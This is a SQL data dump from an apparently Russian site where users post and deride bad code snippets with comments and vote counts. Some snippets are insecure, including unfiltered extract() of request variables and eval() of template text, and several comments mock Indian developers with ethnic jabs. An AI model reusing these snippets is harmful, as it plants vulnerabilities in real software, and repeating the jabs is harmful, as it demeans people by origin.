  (199,1554,1,1229431149,0,'$key_tr = $_key-1;  //// Последний ключ массива (получаем для размещения не базового поля (Media file) на строку выше положенного)\t\r\n\t\r\n\t$new = new stdClass;\r\n\t$new->caption = \"Media File\";\r\n\t$new->name = \"media\";\r\n\t$new->table = \"media\";\r\n\t$new->type = \"file\";\r\n\tif ($role == \"transcriber\")\r\n\t\t$new->read_only = \"read_only\";\r\n\t$fields[$key_tr.''.5''] = $new;\r\n\t\r\n\t\r\n\t\r\n\tksort($fields);','','\"на строку выше положенного\"\r\n\r\nТема грязных хаков:\r\nВ массив 1,2,3,4...N втыркиваем элемент 10.5 (шняга-с половиной) и сортируем по возрастанию ключа. (позже в коде идёт foreach этого массива)\r\nВ проекте наблюдаются элементы развития данного хака ввиде +0.3, +0.4 и т.п.\r\n\r\nВНИМАНИЕ: Не рекомендуем повторять этот трюк! Опасно для здоровья мозга!',11,0,1,0),
  (200,1557,1,1229431978,1229553907,'...\r\n    /**\r\n     * get a concrete filename for automagically created content\r\n     *\r\n     * @param string $auto_base\r\n     * @param string $auto_source\r\n     * @param string $auto_id\r\n     * @return string\r\n     * @staticvar string|null\r\n     * @staticvar string|null\r\n     */\r\n    function _get_auto_filename($auto_base, $auto_source = null, $auto_id = null)\r\n\r\n...','','Ухыхы )\r\nЯ всегда знал, что Smarty жесток.\r\nИ контент у него получается не иначе как autoMAGICally  :-)\r\n\r\nУбицца веником...',-9,0,0,0),
  (201,1565,1,1229447421,0,'$res = $DB->getData($query); //считывает данные с ДБ и загоняет в пронумерованный массив\r\n$data = new array();\r\nforeach ($res as $key=>$value)\r\n{\r\nif (!$data[$key])\r\n$data[$key] = $value;\r\n};','','Все это вместо простого $data = $res;\r\n\r\nhttp://ithappens.ru/ (c)',12,0,1,4),
  (202,1568,8,1229449437,0,'if ((armid == \"3504000036\") || (armid == \"3504000034\"))\r\n            {\r\n                if (armid == \"3504000036\")\r\n                {\r\n                    PlaceSave = \"3243100001\";\r\n                }\r\n                if (armid == \"3504000034\")\r\n                {\r\n                    PlaceSave = \"2311030001\";\r\n                }\r\n            }','','Нет слов, одни эмоции',39,0,1,1),
  (203,1571,10,1229450002,0,'Function nSetColorPair(att : integer) : integer;\r\nvar\r\n   i : integer;\r\nBegin\r\n   bg := att div 16;\r\n   fg := att - (bg * 16);\r\n   While bg > 7 Do dec(bg,8);\r\n   While fg > 7 Do dec(fg,8);\r\n// . . .','','Кусок модуля nCRT для FreePascal 2.2. У нормальных людей att - это байт. И вообще... Говно код!',5,0,1,1),
  (204,1574,1,1229451251,0,'for ($i=0; $i < $this->acl_count; $i++)\r\n\t\t{\r\n\t\t\t$acl =& $this->acl[$i];\r\n\t\t\tif (strcasecmp( $aco_section_value, $acl[0] ) == 0) {\r\n\t\t\t\tif (strcasecmp( $aco_value, $acl[1] ) == 0) {\r\n\t\t\t\t\tif (strcasecmp( $aro_section_value, $acl[2] ) == 0) {\r\n\t\t\t\t\t\tif (strcasecmp( $aro_value, $acl[3] ) == 0) {\r\n\t\t\t\t\t\t\tif ($axo_section_value && $acl[4]) {\r\n\t\t\t\t\t\t\t\tif (strcasecmp( $axo_section_value, $acl[4] ) == 0) {\r\n\t\t\t\t\t\t\t\t\tif (strcasecmp( $axo_value, $acl[5] ) == 0) {\r\n\t\t\t\t\t\t\t\t\t\t$acl_result = @$acl[6] ? $acl[6] : 1;\r\n\t\t\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t} else {\r\n\t\t\t\t\t\t\t\t$acl_result = @$acl[6] ? $acl[6] : 1;\r\n\t\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}','','из ядра Joomla',11,0,1,3),
  (205,1578,9,1229455935,0,'isRegKeyRequired = distKey == null ? false : distKey.equals(\"yes\") ? true : false;','','Уматный ХавнАкоД коллеги из Индии. Ну просто няйсь. Смотрится куда зло*буче чем желаемый вариант (isRegKeyRequired = \"yes\".equals(distKey));',24,0,1,0),
  (206,1581,1,1229456808,0,'if(empty($real_name)) $real_name = $file_name; \t\t\r\nif(empty($real_name)) $real_name=\"fileid_\".$id;\r\n\r\n.... \r\n\r\nif($mode==\"send\") {\r\n\t$head[] = array(\"link\" => \"customer.php?area=$area&mode=send\", \"title\" => func_get_langvar_by_name(\"lbl_send_to_mail\"), active=>\"Y\");\r\n}\telse\t{\r\n\t$head[] = array(\"link\" => \"customer.php?area=$area&mode=send\", \"title\" => func_get_langvar_by_name(\"lbl_send_to_mail\"), active=>\"n\");\r\n}','','Разбирая один из скриптов на досуге, обнаружил, что некоторые программисты уж совсем с головой не дружат.\r\n\r\n1. Думаю, все тут ясно.\r\n2. Чувак явно не знает что такое логика... Мало того, что в одну строку ложится массив, так еще и ВЕЗДЕ строковые ''Y''/''N'' использует вместо булевых труфолсов. И такого говна - тыщи 2 строк. Ы =)\r\n\r\nНе позавидую тем, кто будет дописывать / переделывать.\r\nЗЫ: Скрипт - рип корпоративной системы. ',12,0,1,7),
  (207,1583,9,1229457950,0,'if(isRegKeyRequired) {\r\n            keyItems = new XItem [4];\r\n            valueItems = new XItem [4][];\r\n            totalItems = 4;\r\n\r\n            keyItems[0] = new XItem();\r\n            keyItems[0].setLabel(TextUtils.getText(280),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(countryBox_rp);\r\n            totalItems += setValues(valueItems, values,0);\r\n            keyItems[1] = new XItem();\r\n            keyItems[1].setLabel(TextUtils.getText(281),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(phoneNoBox_rp);\r\n            totalItems += setValues(valueItems, values,1);\r\n            keyItems[2] = new XItem();\r\n            keyItems[2].setLabel(TextUtils.getText(282),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(regKeyBox_rp);\r\n            totalItems += setValues(valueItems, values,2);\r\n            keyItems[3] = new XItem();\r\n            keyItems[3].setLabel(TextUtils.getText(283),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(emailBox_rp);\r\n            totalItems += setValues(valueItems, values,3);\r\n        }\r\n        else {\r\n            keyItems = new XItem [3];\r\n            valueItems = new XItem [3][];\r\n            totalItems = 3;\r\n\r\n            keyItems[0] = new XItem();\r\n            keyItems[0].setLabel(TextUtils.getText(280),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(countryBox_rp);\r\n            totalItems += setValues(valueItems, values,0);\r\n            keyItems[1] = new XItem();\r\n            keyItems[1].setLabel(TextUtils.getText(281),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(phoneNoBox_rp);\r\n            totalItems += setValues(valueItems, values,1);\r\n            keyItems[2] = new XItem();\r\n            keyItems[2].setLabel(TextUtils.getText(283),XItem.LABEL_CONSTRAINT_CENTER);\r\n            values = getValueItems(emailBox_rp);\r\n            totalItems += setValues(valueItems, values,2);\r\n        }','','очень трудолюбивые эти индусы. Такой код - это просто пипец особенно если учесть что приложение разрабатывается для J2ME',21,0,1,7),
  (208,1587,1,1229466716,0,'$temp = $this->template($this->modulePath.\"/right_frame\");\r\neval(\"\\$blockData = \\\"$temp\\\";\");\r\nreturn $blockData;','','Реализация механизма подключения шаблонов в PHP %)',9,0,1,2),
  (212,1606,7,1229516699,0,'bool IsBukva(char symbol)\r\n{\r\nswitch(symbol)\r\n{\r\ncase''a'':return 1;break;\r\ncase''b'':return 1;break;\r\ncase''c'':return 1;break;\r\ncase''d'':return 1;break;\r\ncase''e'':return 1;break;\r\ncase''f'':return 1;break;\r\ncase''g'':return 1;break;\r\ncase''h'':return 1;break;\r\ncase''i'':return 1;break;\r\ncase''j'':return 1;break;\r\ncase''k'':return 1;break;\r\ncase''l'':return 1;break;\r\ncase''m'':return 1;break;\r\ncase''n'':return 1;break;\r\ncase''o'':return 1;break;\r\ncase''p'':return 1;break;\r\ncase''q'':return 1;break;\r\ncase''r'':return 1;break;\r\ncase''s'':return 1;break;\r\ncase''t'':return 1;break;\r\ncase''u'':return 1;break;\r\ncase''v'':return 1;break;\r\ncase''w'':return 1;break;\r\ncase''x'':return 1;break;\r\ncase''y'':return 1;break;\r\ncase''z'':return 1;break;\r\ncase''A'':return 1;break;\r\ncase''B'':return 1;break;\r\ncase''C'':return 1;break;\r\ncase''D'':return 1;break;\r\ncase''E'':return 1;break;\r\ncase''F'':return 1;break;\r\ncase''G'':return 1;break;\r\ncase''H'':return 1;break;\r\ncase''I'':return 1;break;\r\ncase''J'':return 1;break;\r\ncase''K'':return 1;break;\r\ncase''L'':return 1;break;\r\ncase''M'':return 1;break;\r\ncase''N'':return 1;break;\r\ncase''O'':return 1;break;\r\ncase''P'':return 1;break;\r\ncase''Q'':return 1;break;\r\ncase''R'':return 1;break;\r\ncase''S'':return 1;break;\r\ncase''T'':return 1;break;\r\ncase''U'':return 1;break;\r\ncase''V'':return 1;break;\r\ncase''W'':return 1;break;\r\ncase''X'':return 1;break;\r\ncase''Y'':return 1;break;\r\ncase''Z'':return 1;break;\r\ndefault:return 0;\r\n}\r\n}','','Женский вариант проверки символа на букву.\r\nОригинал тут: http://forum.vingrad.ru/forum/topic-240593.html',113,0,1,8),
  (213,1621,7,1229552919,0,'cout<<\"enterX\"<<endl;\r\n     cin >>x;\r\nx = 0.125;','','',25,0,1,1),
  (214,1628,8,1229597094,0,'Почему нет раздела по 1С? )))\r\nПочему нет раздела по 1С? )))\r\nПочему нет раздела по 1С? )))\r\nПочему нет раздела по 1С? )))','','Почему нет раздела по 1С? )))',3,0,1,8),
  (215,1632,7,1229598302,0,'/* This is bad. Reaaly bad. It''s a really, really bad hack. If you''re an employee of \r\n * Intertrode Communication, then I''m really, really sorry that you have to maintain\r\n * this. I was honestly planning on removing this tomorrow, but I''ve been known to \r\n * forget things like this. It happens.\r\n *\r\n * So here''s the thing. I can''t seem to figure out why the AccountId variable isn''t \r\n * set. I''ve looked and looked, but I gotta leave now. Anyway, I''ve found that I can\r\n * just grab the AccountID from the debugging logs.  I suppose that to fix it, you''d\r\n * have to locate where it''s clearing out the ID.\r\n *\r\n * Again, I''m sorry.\r\n */\r\n\r\nif ( (AccountId == NULL) || (AccountId == \"\") ||\r\n     (ServerSesion[\"AccountId\"] == NULL) || (ServerSesion[\"AccountId\"] == \"\") )\r\n{\r\n  //open session logs\r\n  FileHandle file = f_open(LOG_PATH + \"\\sessionlog-\" + LOG_FILE_DATE + \".log\", 1);\r\n  while (file != NULL)\r\n  {\r\n    \r\n    TString line = f_readline(file);\r\n\r\n    //look for IP and changereg\r\n    if ( (sfind(line,REMOTE_ADDR) != -1) && (sfind(line,\"changereg\") != -1) )\r\n    {\r\n      //0000-00-00 00:00 /accountmaint/changereg/?AccountId=123456 255.255.255.255 ...\r\n      //                                                    *\r\n      AccountId = substr(line, 52, 6);\r\n    }\r\n\r\n    if (f_EOF(file)) { f_close(file); file = NULL; }\r\n  }\r\n\r\n}','','У чувака где то перетирается AccountId, так он берет данные из логов IIS''а :) Главное, что он сожалеет об этом.\r\nОтсюда: http://thedailywtf.com/Articles/The_Apologetic_Coder.aspx\r\n',39,0,1,1),
  (216,1643,7,1229608913,0,'n=1;\r\n\twhile ( n <= d_after )\r\n\t{\t\r\n\t\t++n;\r\n\t}\r\n\r\n\tint secs = n-1;','','Best Practices(made by indian)',25,0,1,4),
  (217,1652,1,1229619138,1229932445,'protected function _buildParamsUrl($additional = array()) {\r\n       $url = array();\r\n       $params = $this->_request->getParams();\r\n       $params = array_merge($params);\r\n       foreach ($params as $var => $val) {\r\n           if (in_array($var,$this->_neededParams) && is_scalar($val)) {\r\n                $url[$var] = $val;\r\n           }\r\n       }\r\n       \r\n       $url = array_merge($url,$additional);\r\n       \r\n       return $url;\r\n    }','','Было нужно подставлять параметры из POST в action формы. Почему осталось в таком виде - хз... Видимо было выпито мало кофе с утра...',-5,0,0,0),
  (218,1664,1,1229622835,0,'<?php\r\n    global\r\n        $_REQUEST,\r\n        $_SERVER,\r\n        $_FILES,\r\n        $PHP_SELF,\r\n        $_GET_VARS,$_GET,\r\n        $_POST_VARS,  \r\n        $_POST,\r\n        $_COOKIE,\r\n        $HTTP_ENV_VARS,\r\n        $HTTP_SERVER_VARS,\r\n        $_page,\r\n        $_text,\r\n        $_user,\r\n        $_cook_session,\r\n        $_page_index,\r\n        $_page_title,\r\n        $parce_page;\r\n\r\n    extract($_GET);\r\n    extract($_POST);\r\n    extract($_FILES);\r\n\r\n    while (list($key123, $value123) = each($_GET))    ${$key123}=$value123;\r\n    while (list($key123, $value123) = each($_POST))   ${$key123}=$value123;\r\n    while (list($key123, $value123) = each($_FILES))  ${$key123}=$value123;\r\n\r\n    foreach ($_POST as $key=>$value) {\r\n\t    ${$key}=$value;\r\n\t}\r\n    foreach ($_GET as $key=>$value) {\r\n\t    ${$key}=$value;\r\n\t}\r\n?>','','Цитирую весь файл, как есть',33,0,1,5),
  (219,1666,13,1229625706,0,'''/**\r\n'' * Parser\r\n'' * @param String text\r\n'' * @param Scripting.Dictionary text\r\n'' */\r\nprivate function Parse(text, data)\r\n    dim RE, EM, MO, res, lastIndex, val\r\n    res = \"\"\r\n    Set RE = New RegExp\r\n    RE.Pattern = \"(\\\\?)\\$(?:(\\w+)|\\{(\\w+)\\})\"\r\n    RE.IgnoreCase = False\r\n    RE.Global = True\r\n    Set EM = RE.Execute(text)\r\n    if EM.Count > 0 then\r\n        lastIndex = 1\r\n        for each MO in EM\r\n            if Mid(MO.Value,1,2) = \"\\$\" then\r\n                val = Mid(MO.Value,2)\r\n            else\r\n                if Mid(MO.Value,1,2) = \"${\" then \r\n                    val = Mid(Mid(MO.Value,1,Len(MO.Value)-1),3) \r\n                else \r\n                    val = Mid(MO.Value,2)\r\n                end if\r\n                val = data(val)\r\n            end if\r\n            res = res & Mid(text, lastIndex, MO.FirstIndex-lastIndex+1) & val\r\n            lastIndex = MO.FirstIndex+MO.Length+1\r\n        next\r\n        res = res & Mid(text, lastIndex)\r\n        Parse = res\r\n    else\r\n        Parse = text\r\n    end if\r\nend function','','Пример, как функция, которая в других языках описывается одной строкой, реализуется на этом говноязыке',5,0,1,5),
  (220,1670,9,1229626095,0,'public AlarmKey(AlarmKey key)\r\n    {\r\n        oc = \"\";\r\n        id = \"\";\r\n        source = null;\r\n        oc = key.oc;\r\n        id = key.id;\r\n        source = key.source;\r\n    }','','DoubleCheck :)',18,0,1,1),
  (221,1677,3,1229645971,0,'SELECT DISTINCT BE.ID as ID,BE.NAME as NAME,BE.CODE as CODE,BE.IBLOCK_ID as\r\nIBLOCK_ID,BE.IBLOCK_SECTION_ID as IBLOCK_SECTION_ID,B.DETAIL_PAGE_URL as\r\nDETAIL_PAGE_URL,BE.DETAIL_TEXT as DETAIL_TEXT,BE.DETAIL_TEXT_TYPE as\r\nDETAIL_TEXT_TYPE,BE.DETAIL_PICTURE as DETAIL_PICTURE,BE.PREVIEW_TEXT as\r\nPREVIEW_TEXT,BE.PREVIEW_TEXT_TYPE as PREVIEW_TEXT_TYPE,BE.PREVIEW_PICTURE as\r\nPREVIEW_PICTURE,L.DIR as LANG_DIR,BE.XML_ID as EXTERNAL_ID,B.IBLOCK_TYPE_ID as\r\nIBLOCK_TYPE_ID,B.CODE as IBLOCK_CODE,B.XML_ID as IBLOCK_EXTERNAL_ID FROM\r\nb_iblock B INNER JOIN b_lang L ON B.LID=L.LID INNER JOIN b_iblock_element BE\r\nON BE.IBLOCK_ID = B.ID INNER JOIN b_iblock_section_element BSE ON\r\nBSE.IBLOCK_ELEMENT_ID = BE.ID INNER JOIN b_iblock_section BSubS ON\r\nBSE.IBLOCK_SECTION_ID = BSubS.ID INNER JOIN b_iblock_section BS ON\r\n(BSubS.IBLOCK_ID=BS.IBLOCK_ID AND BSubS.LEFT_MARGIN>=BS.LEFT_MARGIN AND\r\nBSubS.RIGHT_MARGIN<=BS.RIGHT_MARGIN) INNER JOIN b_iblock_property FP1 ON\r\nFP1.IBLOCK_ID=B.ID AND FP1.CODE=''code2'' INNER JOIN b_iblock_element_property\r\nFPV1 ON FP1.ID=FPV1.IBLOCK_PROPERTY_ID AND FPV1.IBLOCK_ELEMENT_ID=BE.ID INNER\r\nJOIN b_iblock_property FP2 ON FP2.IBLOCK_ID=B.ID AND FP2.CODE=''code3'' INNER\r\nJOIN b_iblock_element_property FPV2 ON FP2.ID=FPV2.IBLOCK_PROPERTY_ID AND\r\nFPV2.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP3 ON\r\nFP3.IBLOCK_ID=B.ID AND FP3.CODE=''code4'' INNER JOIN b_iblock_element_property\r\nFPV3 ON FP3.ID=FPV3.IBLOCK_PROPERTY_ID AND FPV3.IBLOCK_ELEMENT_ID=BE.ID INNER\r\nJOIN b_iblock_property FP4 ON FP4.IBLOCK_ID=B.ID AND FP4.CODE=''code5'' INNER\r\nJOIN b_iblock_element_property FPV4 ON FP4.ID=FPV4.IBLOCK_PROPERTY_ID AND\r\nFPV4.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP5 ON\r\nFP5.IBLOCK_ID=B.ID AND FP5.CODE=''code7'' INNER JOIN b_iblock_element_property\r\nFPV5 ON FP5.ID=FPV5.IBLOCK_PROPERTY_ID AND FPV5.IBLOCK_ELEMENT_ID=BE.ID INNER\r\nJOIN b_iblock_property FP6 ON FP6.IBLOCK_ID=B.ID AND FP6.CODE=''code9'' INNER\r\nJOIN b_iblock_element_property FPV6 ON FP6.ID=FPV6.IBLOCK_PROPERTY_ID AND\r\nFPV6.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP7 ON\r\nFP7.IBLOCK_ID=B.ID AND FP7.CODE=''code12'' INNER JOIN b_iblock_element_property\r\nFPV7 ON FP7.ID=FPV7.IBLOCK_PROPERTY_ID AND FPV7.IBLOCK_ELEMENT_ID=BE.ID INNER\r\nJOIN b_iblock_property FP8 ON FP8.IBLOCK_ID=B.ID AND FP8.CODE=''code15'' INNER\r\nJOIN b_iblock_element_property FPV8 ON FP8.ID=FPV8.IBLOCK_PROPERTY_ID AND\r\nFPV8.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP9 ON\r\nFP9.IBLOCK_ID=B.ID AND FP9.CODE=''code16'' INNER JOIN b_iblock_element_property\r\nFPV9 ON FP9.ID=FPV9.IBLOCK_PROPERTY_ID AND FPV9.IBLOCK_ELEMENT_ID=BE.ID INNER\r\nJOIN b_iblock_property FP10 ON FP10.IBLOCK_ID=B.ID AND FP10.CODE=''code18''\r\nINNER JOIN b_iblock_element_property FPV10 ON FP10.ID=FPV10.IBLOCK_PROPERTY_ID\r\nAND FPV10.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP11 ON\r\nFP11.IBLOCK_ID=B.ID AND FP11.CODE=''code23'' INNER JOIN\r\nb_iblock_element_property FPV11 ON FP11.ID=FPV11.IBLOCK_PROPERTY_ID AND\r\nFPV11.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP12 ON\r\nFP12.IBLOCK_ID=B.ID AND FP12.CODE=''code26'' INNER JOIN\r\nb_iblock_element_property FPV12 ON FP12.ID=FPV12.IBLOCK_PROPERTY_ID AND\r\nFPV12.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP13 ON\r\nFP13.IBLOCK_ID=B.ID AND FP13.CODE=''code27'' INNER JOIN\r\nb_iblock_element_property FPV13 ON FP13.ID=FPV13.IBLOCK_PROPERTY_ID AND\r\nFPV13.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP14 ON\r\nFP14.IBLOCK_ID=B.ID AND FP14.CODE=''code32'' INNER JOIN\r\nb_iblock_element_property FPV14 ON FP14.ID=FPV14.IBLOCK_PROPERTY_ID AND\r\nFPV14.IBLOCK_ELEMENT_ID=BE.ID INNER JOIN b_iblock_property FP15 ON\r\nFP15.IBLOCK_ID=B.ID AND FP15.CODE=''code34'' INNER JOIN\r\nb_iblock_element_property FPV15 ON FP15.ID=FPV15.IBLOCK_PROPERTY_ID AND\r\nFPV15.IBLOCK_ELEMENT_ID=BE.ID WHERE 1=1 AND B.ID IN (0,42) AND (\r\n(BE.WF_STATUS_ID=1 AND BE.WF_PARENT_ELEMENT_ID IS NULL) ) AND ((((\r\n(upper(BE.NAME) like upper(''%acer7730G%'') and BE.NAME is not null) )))) AND\r\n(((( (upper(FPV1.VALUE) like upper(''%Intel%'') and FPV1.VALUE is not null) AND\r\n(upper(FPV1.VALUE) like upper(''%Core2Duo%'') and FPV1.VALUE is not null) AND\r\n(upper(FPV1.VALUE) like upper(''%T5850%'') and FPV1.VALUE is not null) AND\r\n(upper(FPV1.VALUE) like upper(''%2.16GHz%'') and FPV1.VALUE is not null) ))))\r\nAND (((( (upper(FPV2.VALUE) like upper(''%4096Mb%'') and FPV2.VALUE is not null)\r\nAND ( (upper(FPV2.VALUE) like upper(''%4Gb%'') and FPV2.VALUE is not null) ) AND\r\n(upper(FPV2.VALUE) like upper(''%DDRII%'') and FPV2.VALUE is not null) )))) AND\r\n(((( (upper(FPV3.VALUE) like upper(''%2x320Gb%'') and FPV3.VALUE is not null)\r\nAND (upper(FPV3.VALUE) like upper(''%5400rpm%'') and FPV3.VALUE is not null) AND\r\n(upper(FPV3.VALUE) like upper(''%SATA%'') and FPV3.VALUE is not null) )))) AND\r\n(((( (upper(FPV4.VALUE) like upper(''%17%'') and FPV4.VALUE is not null) ))))\r\nAND (((( (upper(FPV5.VALUE) like upper(''%??%'') and FPV5.VALUE is not null)\r\n)))) AND (((( (upper(FPV6.VALUE) like upper(''%64Mb%'') and FPV6.VALUE is not\r\nnull) AND ( (upper(FPV6.VALUE) like upper(''%??%'') and FPV6.VALUE is not null)\r\nAND (upper(FPV6.VALUE) like upper(''%958Mb%'') and FPV6.VALUE is not null) )))))\r\nAND (((( (upper(FPV7.VALUE) like upper(''%??%'') and FPV7.VALUE is not null)\r\n)))) AND (((( (upper(FPV8.VALUE) like upper(''%Bluetooth%'') and FPV8.VALUE is\r\nnot null) AND (upper(FPV8.VALUE) like upper(''%V2.0%'') and FPV8.VALUE is not\r\nnull) AND (upper(FPV8.VALUE) like upper(''%EDR%'') and FPV8.VALUE is not null)\r\n)))) AND (((( (upper(FPV9.VALUE) like upper(''%4%'') and FPV9.VALUE is not null)\r\n)))) AND (((( (upper(FPV10.VALUE) like upper(''%??%'') and FPV10.VALUE is not\r\nnull) )))) AND (((( (upper(FPV11.VALUE) like upper(''%??%'') and FPV11.VALUE is\r\nnot null) )))) AND (((( (upper(FPV12.VALUE) like upper(''%??%'') and FPV12.VALUE\r\nis not null) )))) AND (((( (upper(FPV13.VALUE) like upper(''%WebCam%'') and\r\nFPV13.VALUE is not null) AND (upper(FPV13.VALUE) like upper(''%1,3Mpx%'') and\r\nFPV13.VALUE is not null) )))) AND (((( (upper(FPV14.VALUE) like\r\nupper(''%?????%'') and FPV14.VALUE is not null) )))) AND ((((\r\n(upper(FPV15.VALUE) like upper(''%12%'') and FPV15.VALUE is not null) AND\r\n(upper(FPV15.VALUE) like upper(''%???????%'') and FPV15.VALUE is not null) ))))\r\nAND ((((BE.IBLOCK_ID = ''42'')))) AND (((BE.ACTIVE_TO >= now() OR BE.ACTIVE_TO\r\nIS NULL) AND (BE.ACTIVE_FROM <= now() OR BE.ACTIVE_FROM IS NULL))) AND\r\n((((BE.ACTIVE=''Y'')))) AND ((BS.ID = 224)) ORDER BY BE.SORT asc , BE.ID desc\r\nLIMIT 0, 30','','Битрикс (http://dev.1c-bitrix.ru/community/forums/forum6/topic14898/)',42,0,1,13),
  (222,1680,1,1229662999,0,'<div id=\"navLine\">\r\n        <? if(isset($title5)) { ?>\r\n          <a href=\"index.php\">Главная</a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link?>\"><?=htmlspecialchars($title)?></a> &nbsp;&raquo;\r\n          <a href=\"index.php?page=<?=$link2?>\"><?=htmlspecialchars($title2)?></a> &nbsp;&raquo;\r\n          <a href=\"index.php?page=<?=$link3?>#\"><?=htmlspecialchars($title3)?></a> &nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link4?>\"><?=htmlspecialchars($title4)?></a>\r\n        <? } elseif(isset($title4)) { ?>\r\n          <a href=\"index.php\">Главная</a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link?>\"><?=htmlspecialchars($title)?></a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link2?>\"><?=htmlspecialchars($title2)?></a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link3?>\"><?=htmlspecialchars($title3)?></a>\r\n        <? } elseif(isset($title3)) { ?>\r\n          <a href=\"index.php\">Главная</a>&nbsp;&raquo;\r\n          <a href=\"index.php?page=<?=$link?>\"><?=htmlspecialchars($title)?></a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link2?>\"><?=htmlspecialchars($title2)?></a>\r\n        <? } elseif(isset($title2)) { ?>\r\n          <a href=\"index.php\">Главная</a>&nbsp;&raquo; \r\n          <a href=\"index.php?page=<?=$link?>\"><?=htmlspecialchars($title)?></a>\r\n        <? } else { ?>\r\n          <a href=\"index.php\">Главная</a>\r\n        <? } ?>\r\n  </div>','','',15,0,1,4),
  (223,1688,8,1229680532,0,'private void UpdateLabel(string str)\r\n        {\r\n            if (str == \"!0123clear3210!\")\r\n            {\r\n                textBox1.Clear();\r\n                return;\r\n            }\r\n            textBox1.AppendText(str);\r\n        }','','а иногда стираем',16,0,1,3),
  (224,1699,1,1229691382,1230200085,'<?php\r\n#----0000------------------------------------#\r\n#----00--00----------------------------------#\r\n#----00---000----000000----000000--#\r\n#----00---0000--00----00----00---00--#\r\n#----00---0000--00-----------00---------#\r\n#----00---0000--000000----00000----#\r\n#----00---000----00-----------00---------#\r\n#----00--00-------00---00----00---------#\r\n#----0000---------000000---00----------#\r\n#===============================#\r\n#       +Загруз центр for JohnCMS+     #\r\n#                      Автор  def                      #\r\n#                 ICQ: 9904080                    #\r\n# По всем вопросам пишите в ICQ. #\r\n#------------------------------------------------#\r\ndefine(''_IN_JOHNCMS'',1);\r\n\r\nrequire_once (\"../incfiles/core.php\");\r\nrequire_once (\"../incfiles/head.php\");      // Загрузка темы оформления\r\n///////////////////\r\nrequire_once \"inc/func.inc\";\r\nrequire_once \"inc/conf.inc\";\r\nantihack();','24','стоит ли показывать [b]остальной[/b] файл?',-4,0,0,5),
  (225,1711,7,1229695243,1229969704,'#include <iostream>\r\n#define true false\r\n#define false true\r\nusing namespace std;\r\nint main(){\r\n\tbool a = true;\r\n\tbool b = false;\r\n\tcout << \"a \" << a << endl << \"b \" << b << endl;\r\n\tsystem(\"pause\");\r\n\treturn 0;\r\n}','','По логике должно всё стать вечным тру, а получаем без изменений:(',-10,0,0,0),
  (226,1713,7,1229696043,1230024837,'while (!bFound && j < enmMessages)\r\n{\r\n\tif (!strcmp(str.operator const char * (), strPacketName[j]))\r\n\t{\r\n\t\tiPacketType = j;\r\n\t\tbFound = true;\r\n\t\tTRACE(\" of type %s\\n\",strPacketName[j]);\r\n\t\tstrcat(strOut,\" of type \");\r\n\t\tstrcat(strOut, strPacketName[j]);\r\n\t\tbreak;\r\n\t}\r\n\tj++;\r\n}','','',-7,0,0,0),
  (227,1717,7,1229705814,0,'CString temp;\r\ntemp.Preallocate(5000);\r\nGetName(temp.GetBuffer());\r\nname_.Format(L\"%s\", temp);','4','На самом деле после GetBuffer нужен ReleaseBuffer и Preallocate резервирует место, но не устанавливает длину. \r\nЭти ошибки приводят к тому что  использование name_ в GetName не работает и name_ = temp тоже не работает. \r\nХитрый \"индокодер\" выкрутился через Format.',10,0,1,0),
  (228,1721,7,1229720763,1229810121,'source code: C++\r\n\r\n\r\nenum e_acomany {\r\n\tAudi,\r\n\tBMW, \r\n\tCadillac, \r\n\tFord,\r\n\tJaguar, \r\n\tLexus \r\n\tMaybach, \r\n\tRollsRoyce, \r\n\tSaab\r\n};\r\n?>','','Маны бывают разные. Этот, например, по C++',-12,0,0,3),
  (229,1729,10,1229778993,0,'b:=(1-(n+1))/2','','Ничего не трогать, пусть работает, как есть!',2,0,1,5),
  (230,1732,9,1229785757,0,'private void setTims( String project )\r\n{\r\n    int endIndex = project.indexOf( \"-\" );\r\n    boolean isNumber = false;\r\n    if ( endIndex != -1 )\r\n    {\r\n        try\r\n        {\r\n            Integer.parseInt( project.substring( 0, endIndex ) );\r\n            isNumber = true;\r\n        }\r\n        catch ( NumberFormatException e )\r\n        {\r\n            //ignore\r\n        }\r\n    }\r\n    if ( isNumber )\r\n    {\r\n        runtimeContext.put( RuntimeContext.TIMS_NUMBER, project.substring( 0, endIndex ) );\r\n    }\r\n    else\r\n    {\r\n        runtimeContext.put( RuntimeContext.TIMS_NUMBER, project );\r\n    }\r\n}','','',10,0,1,0),
